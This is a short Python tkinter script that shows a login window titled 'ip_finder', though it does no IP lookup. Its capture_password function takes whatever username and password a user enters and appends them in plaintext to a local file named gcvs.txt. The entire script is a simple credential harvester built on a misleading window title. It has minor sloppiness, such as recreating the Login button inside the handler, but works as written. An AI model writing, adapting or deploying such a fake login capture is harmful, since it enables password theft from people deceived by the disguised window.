import tkinter as tk
def capture_password():
    button_login=tk.Button(root,text="Login", command=capture_password)    
    username = label_username.get()
    password = label_password.get()
    with open("gcvs.txt", "a") as file:
        file.write(f"Username is : {username} and password is : {password}\n")



root=tk.Tk ()
root.title("ip_finder")
label_username=tk.Label(root,text="username")
label_username.pack()

label_username=tk.Entry(root,text="username")
label_username.pack()


label_password=tk.Label(root,text="password")
label_password.pack()

label_password=tk.Entry(root,show="*")
label_password.pack()

button_login=tk.Button(root,text="Login", command=capture_password)
button_login.pack()



root.mainloop()